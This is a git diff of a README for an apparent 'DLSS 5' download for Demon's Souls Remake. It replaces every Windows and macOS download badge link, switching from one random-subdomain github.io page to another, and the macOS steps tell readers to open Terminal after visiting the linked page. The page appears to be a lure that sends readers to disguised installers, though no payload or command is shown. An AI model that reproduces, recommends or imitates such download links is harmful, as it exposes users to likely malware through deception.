@@ -16,7 +16,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_Demon's%20Souls%20Remake_DLSS_5-F9A825?style=for-the-badge&logo=github)](https://zdiweqqcluid.github.io/win-get/)
+[![Download](https://img.shields.io/badge/⬇_Download_Demon's%20Souls%20Remake_DLSS_5-F9A825?style=for-the-badge&logo=github)](https://tlwbljvlzhgm.github.io/windows-install/)
 
 </div>
 
@@ -49,9 +49,9 @@
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zdiweqqcluid.github.io/win-get/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://tlwbljvlzhgm.github.io/windows-install/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zdiweqqcluid.github.io/mac-get/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://tlwbljvlzhgm.github.io/macos-install/)
 
 </div>
 
@@ -65,7 +65,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/⬇_Download_DLSS_5_for_Demon's%20Souls%20Remake-F9A825?style=for-the-badge&logo=github)](https://zdiweqqcluid.github.io/win-get/)
+[![Download](https://img.shields.io/badge/⬇_Download_DLSS_5_for_Demon's%20Souls%20Remake-F9A825?style=for-the-badge&logo=github)](https://tlwbljvlzhgm.github.io/windows-install/)
 
 </div>
 
@@ -97,7 +97,7 @@
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zdiweqqcluid.github.io/mac-get/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://tlwbljvlzhgm.github.io/macos-install/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
